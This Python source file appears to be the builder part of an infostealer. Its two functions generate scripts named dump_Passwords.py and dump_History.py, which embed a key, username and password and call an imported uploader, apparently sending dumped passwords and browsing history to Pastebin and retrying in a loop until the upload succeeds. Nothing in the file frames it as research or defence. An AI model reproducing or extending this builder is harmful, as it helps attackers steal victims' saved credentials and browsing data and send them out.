def build_pass(key , username, Password):
	with open("dump_Passwords.py","w+") as file:
		file.write("from Uptomage import UptoBastebinPass\n")
		file.write("from time import sleep\n")
		file.write("""
def run():
	if __name__ == "__main__":
		while 1:
			try:
				""")
		file.write(""" 
				PassW = UptoBastebinPass()
				""")
		file.write(""+"PassW.up("+"'"+key + "'" +"," + "'" + username +"'"+"," +"'"+ Password + "'" +")" + "\n")
		file.write("				"+"break")
		file.write("""
			except Exception:
				sleep(20)
	""")
		file.write(""" 
run()
	""")
		file.close()


def build_History(key , username, Password):
	with open("dump_History.py","w+") as file:
		file.write("from Uptomage import UptoBastebinHS\n")
		file.write("from time import sleep\n")
		file.write("""
def run():
	if __name__ == "__main__":
		while 1:
			try:
	""")
		file.write(""" 
				PassW = UptoBastebinHS()
				""")
		file.write(""+"PassW.up("+"'"+key + "'" +"," + "'" + username +"'"+"," +"'"+ Password + "'" +")" + "\n")
		file.write("				"+"break")
		file.write("""
			except Exception:
				sleep(20)
	""")
		file.write(""" 
run()
	""")
		file.close()